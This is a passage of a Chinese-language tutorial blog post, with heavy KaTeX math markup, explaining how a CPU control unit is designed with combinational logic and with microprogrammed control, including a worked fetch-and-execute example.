mathnormal" style="margin-right:0.10903em;">M</span><span class="mord mathnormal">A</span><span class="mord mathnormal" style="margin-right:0.00773em;">R</span><span class="mclose">)</span></span></span></span></p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext>向量地址</mtext><mo>→</mo><mi>P</mi><mi>C</mi></mrow><annotation encoding="application/x-tex">向量地址\rightarrow PC</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord cjk_fallback">向</span><span class="mord cjk_fallback">量</span><span class="mord cjk_fallback">地</span><span class="mord cjk_fallback">址</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span></span></span></span></p><p>中断隐指令完成</p></li></ol><h4 id="组合逻辑设计步骤"><a class="markdownIt-Anchor" href="#组合逻辑设计步骤"></a> 组合逻辑设计步骤</h4><p>“非常简单”，只要用逻辑表达式写出任何一个控制信号产生的条件，再进行硬件实现就可以了。</p><p>所以我们首先需要列出操作时间表，把所有可能的微操作列在微操作命令信号列表里。</p><h5 id="列出操作时间表"><a class="markdownIt-Anchor" href="#列出操作时间表"></a> 列出操作时间表</h5><p>列出组合程序逻辑表格如下</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/%E7%BB%84%E5%90%88%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E8%A1%A82.drawio.svg" alt="组合程序设计表2.drawio" /></p><h5 id="写出微操作命令的最简表达式"><a class="markdownIt-Anchor" href="#写出微操作命令的最简表达式"></a> 写出微操作命令的最简表达式</h5><p>根据表格，结合数字逻辑的知识，很容易写出并化简微操作指令对应的最简表达式。</p><p>比如<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>M</mi><mo stretchy="false">(</mo><mi>M</mi><mi>A</mi><mi>R</mi><mo stretchy="false">)</mo><mo>→</mo><mi>M</mi><mi>D</mi><mi>R</mi></mrow><annotation encoding="application/x-tex">M(MAR)\rightarrow MDR</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="mord mathnormal">A</span><span class="mord mathnormal" style="margin-right:0.00773em;">R</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="mord mathnormal" style="margin-right:0.02778em;">D</span><span class="mord mathnormal" style="margin-right:0.00773em;">R</span></span></span></span></p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mtable rowspacing="0.15999999999999992em" columnalign="left" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mo>=</mo><mrow><mi mathvariant="normal">F</mi><mi mathvariant="normal">E</mi></mrow><mo>⋅</mo><msub><mi>T</mi><mn>1</mn></msub><mo>+</mo><mrow><mi mathvariant="normal">I</mi><mi mathvariant="normal">N</mi><mi mathvariant="normal">D</mi></mrow><mo>⋅</mo><msub><mi>T</mi><mn>1</mn></msub><mo stretchy="false">(</mo><mrow><mi mathvariant="bold">A</mi><mi mathvariant="bold">D</mi><mi mathvariant="bold">D</mi></mrow><mo>+</mo><mrow><mi mathvariant="normal">S</mi><mi mathvariant="normal">T</mi><mi mathvariant="normal">A</mi></mrow><mo>+</mo><mrow><mi mathvariant="normal">L</mi><mi mathvariant="normal">D</mi><mi mathvariant="normal">A</mi></mrow><mo>+</mo><mrow><mi mathvariant="normal">J</mi><mi mathvariant="normal">M</mi><mi mathvariant="normal">P</mi></mrow><mo>+</mo><mrow><mi mathvariant="bold">B</mi><mi mathvariant="bold">A</mi><mi mathvariant="bold">N</mi></mrow><mo stretchy="false">)</mo></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mo>+</mo><mrow><mi mathvariant="normal">E</mi><mi mathvariant="normal">X</mi></mrow><mo>⋅</mo><msub><mi>T</mi><mn>1</mn></msub><mo stretchy="false">(</mo><mrow><mi mathvariant="bold">A</mi><mi mathvariant="bold">D</mi><mi mathvariant="bold">D</mi></mrow><mo>+</mo><mrow><mi mathvariant="normal">L</mi><mi mathvariant="normal">D</mi><mi mathvariant="normal">A</mi></mrow><mo stretchy="false">)</mo></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mo>=</mo><msub><mi>T</mi><mn>1</mn></msub><mo stretchy="false">{</mo><mrow><mi mathvariant="normal">F</mi><mi mathvariant="normal">E</mi></mrow><mo>+</mo><mrow><mi mathvariant="normal">I</mi><mi mathvariant="normal">N</mi><mi mathvariant="normal">D</mi></mrow><mo stretchy="false">(</mo><mrow><mi mathvariant="bold">A</mi><mi mathvariant="bold">D</mi><mi mathvariant="bold">D</mi></mrow><mo>+</mo><mrow><mi mathvariant="normal">S</mi><mi mathvariant="normal">T</mi><mi mathvariant="normal">A</mi></mrow><mo>+</mo><mrow><mi mathvariant="normal">L</mi><mi mathvariant="normal">D</mi><mi mathvariant="normal">A</mi></mrow><mo>+</mo><mrow><mi mathvariant="normal">J</mi><mi mathvariant="normal">M</mi><mi mathvariant="normal">P</mi></mrow><mo>+</mo><mrow><mi mathvariant="normal">B</mi><mi mathvariant="normal">A</mi><mi mathvariant="normal">N</mi></mrow><mo stretchy="false">)</mo></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mo>+</mo><mrow><mi mathvariant="bold">E</mi><mi mathvariant="bold">X</mi></mrow><mo stretchy="false">(</mo><mrow><mi mathvariant="bold">A</mi><mi mathvariant="bold">D</mi><mi mathvariant="bold">D</mi></mrow><mo>+</mo><mrow><mi mathvariant="bold">L</mi><mi mathvariant="bold">D</mi><mi mathvariant="bold">A</mi></mrow><mo stretchy="false">)</mo><mo stretchy="false">}</mo></mrow></mstyle></mtd></mtr></mtable><annotation encoding="application/x-tex">\begin{array}{l}=\mathrm{FE} \cdot T_{1}+\mathrm{IND} \cdot T_{1}(\mathbf{A D D}+\mathrm{STA}+\mathrm{LDA}+\mathrm{JMP}+\mathbf{B A N}) \\+\mathrm{EX} \cdot T_{1}(\mathbf{A D D}+\mathrm{LDA}) \\=T_{1}\{\mathrm{FE}+\mathrm{IND}(\mathbf{A D D}+\mathrm{STA}+\mathrm{LDA}+\mathrm{JMP}+\mathrm{BAN}) \\+\mathbf{E X}(\mathbf{A D D}+\mathbf{L D A})\} \\\end{array}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:4.800000000000001em;vertical-align:-2.1500000000000004em;"></span><span class="mord"><span class="mtable"><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-l"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.6500000000000004em;"><span style="top:-4.8100000000000005em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord"><span class="mord mathrm">F</span><span class="mord mathrm">E</span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⋅</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.13889em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathrm">I</span><span class="mord mathrm">N</span><span class="mord mathrm">D</span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⋅</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.13889em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord"><span class="mord mathbf">A</span><span class="mord mathbf">D</span><span class="mord mathbf">D</span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathrm">S</span><span class="mord mathrm">T</span><span class="mord mathrm">A</span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathrm">L</span><span class="mord mathrm">D</span><span class="mord mathrm">A</span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathrm">J</span><span class="mord mathrm">M</span><span class="mord mathrm">P</span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathbf">B</span><span class="mord mathbf">A</span><span class="mord mathbf">N</span></span><span class="mclose">)</span></span></span><span style="top:-3.61em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">+</span><span class="mord"><span class="mord mathrm">E</span><span class="mord mathrm">X</span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⋅</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.13889em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord"><span class="mord mathbf">A</span><span class="mord mathbf">D</span><span class="mord mathbf">D</span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathrm">L</span><span class="mord mathrm">D</span><span class="mord mathrm">A</span></span><span class="mclose">)</span></span></span><span style="top:-2.4099999999999997em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.13889em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">{</span><span class="mord"><span class="mord mathrm">F</span><span class="mord mathrm">E</span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathrm">I</span><span class="mord mathrm">N</span><span class="mord mathrm">D</span></span><span class="mopen">(</span><span class="mord"><span class="mord mathbf">A</span><span class="mord mathbf">D</span><span class="mord mathbf">D</span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathrm">S</span><span class="mord mathrm">T</span><span class="mord mathrm">A</span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathrm">L</span><span class="mord mathrm">D</span><span class="mord mathrm">A</span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathrm">J</span><span class="mord mathrm">M</span><span class="mord mathrm">P</span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathrm">B</span><span class="mord mathrm">A</span><span class="mord mathrm">N</span></span><span class="mclose">)</span></span></span><span style="top:-1.2099999999999997em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">+</span><span class="mord"><span class="mord mathbf">E</span><span class="mord mathbf">X</span></span><span class="mopen">(</span><span class="mord"><span class="mord mathbf">A</span><span class="mord mathbf">D</span><span class="mord mathbf">D</span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathbf">L</span><span class="mord mathbf">D</span><span class="mord mathbf">A</span></span><span class="mclose">)</span><span class="mclose">}</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:2.1500000000000004em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span></span></span></span></span></span></p><h5 id="画出逻辑图"><a class="markdownIt-Anchor" href="#画出逻辑图"></a> 画出逻辑图</h5><p>根据最简表达式，就可以做出对应的硬件连接图。</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20240706160526603.png" alt="image-20240706160526603" /></p><h5 id="小结"><a class="markdownIt-Anchor" href="#小结"></a> 小结</h5><p>组合逻辑设计，这种方法即首先列出操作指令表，然后对指令对应的最简表达式，最后根据表达式作图。</p><p>这种方法有以下三个特点：</p><ul><li>思路清晰，简单明了，任何一个控制信号都可以写出逻辑表达式</li><li>庞杂，调试困难，修改困难（因为都是硬件电路）</li><li>速度快，RISV精简指令集即采用这种设计方法；CPU支持整型运算和浮点运算，其中整型运算也采用组合逻辑CU</li></ul><h3 id="微程序设计"><a class="markdownIt-Anchor" href="#微程序设计"></a> 微程序设计</h3><p>微程序设计的方法是由1951年英国剑桥大学教授Wilkes提出的，这种方法非常适合指令扩展。</p><p>我们知道，不同节拍下发出的控制命令是有先后顺序的，控制命令实际上就是一个或者几个电信号，由这些电信号去控制部件执行相应的操作。</p><p>微程序设计的思想就是把这些电信号储存起来，存储器存储的0或1数据，代表一个节拍下组成控制命令的高低电平信号，我们可以利用这些高低电平信号来表示一个节拍中我们要发出的控制命令。所以我们把微指令保存在ROM中，执行时一条一条读出，微指令的先后顺序就是微操作执行的先后顺序，根据每条微指令有效信号的个数和位数发出相应的微操作命令。</p><p>因此，微程序设计又称<strong>存储逻辑方式</strong>，即把逻辑信号存储在存储器中。</p><p>可以参照下图理解：</p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20240706163101937.png" alt="image-20240706163101937" style="zoom:50%;" /><p>一个指令周期包含多个机器周期，一条机器指令对应一个微程序，微程序对应的是一系列微指令，一条微指令又对应一系列的微操作命令。</p><h4 id="微程序控制单元基本框图"><a class="markdownIt-Anchor" href="#微程序控制单元基本框图"></a> 微程序控制单元基本框图</h4><p>以下是微程序控制单元设计的基本框图。</p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20240706163801863.png" alt="image-20240706163801863" style="zoom:50%;" /><ul><li>核心是控制存储器，保存微指令。执行时要知道微指令的地址，地址保存在控制存储器地址寄存器（CMAR）中，读出的微指令放入CMDR。</li><li>每条指令执行阶段对应的微操作是不一样的，所以微程序首地址也是不一样的。</li><li>根据执行的指令，确定微程序在控制存储器中的首地址，所以还需要微地址形成部件。</li><li>顺序逻辑：CMAR中的地址有多个来源，用顺序逻辑选择一个正确的来源。</li><li>操作控制：一串0和1，其中1代表对应的微操作命令。</li><li>顺序控制：给出下一条微指令的地址</li></ul><p>整体操作类似于计算机访存，都有MAR（CMAR）和MDR（CMDR）寄存器。只不过控制存储器在CPU内部，所以访问速度会比一般的访存更快。</p><p>在控制存储器中，结构框图如下：</p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20240706164304889.png" alt="image-20240706164304889" style="zoom:50%;" /><p>M+2的下地址不一定是M+3，如果直接进入执行周期，根据指令译码才能指导是什么指令，该执行哪里的微程序，需要依赖微地址形成部件得到下条微指令地址，所以M+2的下地址为XXX。</p><h4 id="工作原理"><a class="markdownIt-Anchor" href="#工作原理"></a> 工作原理</h4><p>我们通过执行以下指令来演示微程序设计的工作原理。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">LDA X</span><br><span class="line">ADD Y</span><br><span class="line">STA Y</span><br><span class="line">STP</span><br></pre></td></tr></table></figure><h5 id="取指阶段"><a class="markdownIt-Anchor" href="#取指阶段"></a> 取指阶段</h5><p>此阶段执行取指微程序</p><ol><li><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>M</mi><mo>→</mo><mi>C</mi><mi>M</mi><mi>A</mi><mi>R</mi></mrow><annotation encoding="application/x-tex">M\rightarrow CMAR</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="mord mathnormal">A</span><span class="mord mathnormal" style="margin-right:0.00773em;">R</span></span></span></span></p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>C</mi><mi>M</mi><mo stretchy="false">(</mo><mi>C</mi><mi>M</mi><mi>A</mi><mi>R</mi><mo stretchy="false">)</mo><mo>→</mo><mi>C</mi><mi>M</mi><mi>D</mi><mi>R</mi></mrow><annotation encoding="application/x-tex">CM(CMAR)\rightarrow CMDR</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="mord mathnormal">A</span><span class="mord mathnormal" style="margin-right:0.00773em;">R</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="mord mathnormal" style="margin-right:0.02778em;">D</span><span class="mord mathnormal" style="margin-right:0.00773em;">R</span></span></span></span></p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>C</mi><mi>M</mi><mi>D</mi><mi>R</mi></mrow><annotation encoding="application/x-tex">CMDR</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="mord mathnormal" style="margin-right:0.02778em;">D</span><span class="mord mathnormal" style="margin-right:0.00773em;">R</span></span></span></span>发出命令</p><p>形成下一条微指令地址<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>M</mi><mo>+</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">M+1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.76666em;vertical-align:-0.08333em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span></span></span></span></p></li><li><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>A</mi><mi>d</mi><mo stretchy="false">(</mo><mi>C</mi><mi>M</mi><mi>D</mi><mi>R</mi><mo stretchy="false">)</mo><mo>→</mo><mi>C</mi><mi>M</mi><mi>A</mi><mi>R</mi></mrow><annotation encoding="application/x-tex">Ad(CMDR)\rightarrow CMAR</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">A</span><span class="mord mathnormal">d</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="mord mathnormal" style="margin-right:0.02778em;">D</span><span class="mord mathnormal" style="margin-right:0.00773em;">R</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="mord mathnormal">A</span><span class="mord mathnormal" style="margin-right:0.00773em;">R</span></span></span></span></p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>C</mi><mi>M</mi><mo stretchy="false">(</mo><mi>C</mi><mi>M</mi><mi>A</mi><mi>R</mi><mo stretchy="false">)</mo><mo>→</mo><mi>C</mi><mi>M</mi><mi>D</mi><mi>R</mi></mrow><annotation encoding="application/x-tex">CM(CMAR)\rightarrow CMDR</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="mord mathnormal">A</span><span class="mord mathnormal" style="margin-right:0.00773em;">R</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="mord mathnormal" style="margin-right:0.02778em;">D</span><span class="mord mathnormal" style="margin-right:0.00773em;">R</span></span></span></span></p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>C</mi><mi>M</mi><mi>D</mi><mi>R</mi></mrow><annotation encoding="application/x-tex">CMDR</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="mord mathnormal" style="margin-right:0.02778em;">D</span><span class="mord mathnormal" style="margin-right:0.00773em;">R</span></span></span></span>发出命令</p><p>形成下一条微指令地址<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>M</mi><mo>+</mo><mn>2</mn></mrow><annotation encoding="application/x-tex">M+2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.76666em;vertical-align:-0.08333em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">2</span></span></span></span></p></li><li><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>A</mi><mi>d</mi><mo>→</mo><mi>C</mi><mi>M</mi><mi>A</mi><mi>R</mi></mrow><annotation encoding="application/x-tex">Ad\rightarrow CMAR</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal">A</span><span class="mord mathnormal">d</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="mord mathnormal">A</span><span class="mord mathnormal" style="margin-right:0.00773em;">R</span></span></span></span></p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>C</mi><mi>M</mi><mo stretchy="false">(</mo><mi>C</mi><mi>M</mi><mi>A</mi><mi>R</mi><mo stretchy="false">)</mo><mo>→</mo><mi>C</mi><mi>M</mi><mi>D</mi><mi>R</mi></mrow><annotation encoding="application/x-tex">CM(CMAR)\rightarrow CMDR</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="mord mathnormal">A</span><span class="mord mathnormal" style="margin-right:0.00773em;">R</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="mord mathnormal" style="margin-right:0.02778em;">D</span><span class="mord mathnormal" style="margin-right:0.00773em;">R</span></span></span></span></p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>C</mi><mi>M</mi><mi>D</mi><mi>R</mi></mrow><annotation encoding="application/x-tex">CMDR</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="mord mathnormal" style="margin-right:0.02778em;">D</span><span class="mord mathnormal" style="margin-right:0.00773em;">R</span></span></span></span>发出命令</p><p>由于下地址为<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>X</mi><mi>X</mi><mi>X</mi></mrow><annotation encoding="application/x-tex">XXX</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span></span></span></span>，表示下一条微指令的地址不能由下地址给出，而是要进入到间址阶段或执行阶段</p></li></ol><h5 id="执行阶段"><a class="markdownIt-Anchor" href="#执行阶段"></a> 执行阶段</h5><p>此阶段执行LDA微程序</p><ol><li><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mi>P</mi><mo stretchy="false">(</mo><mi>I</mi><mi>R</mi><mo stretchy="false">)</mo><mo>→</mo><mtext>微地址形成部件</mtext><mo>→</mo><mi>C</mi><mi>M</mi><mi>A</mi><mi>R</mi><mtext>（</mtext><mi>P</mi><mo>→</mo><mi>C</mi><mi>M</mi><mi>A</mi><mi>R</mi><mtext>）</mtext></mrow><annotation encoding="application/x-tex">OP(IR)\rightarrow 微地址形成部件\rightarrow CMAR  （P\rightarrow 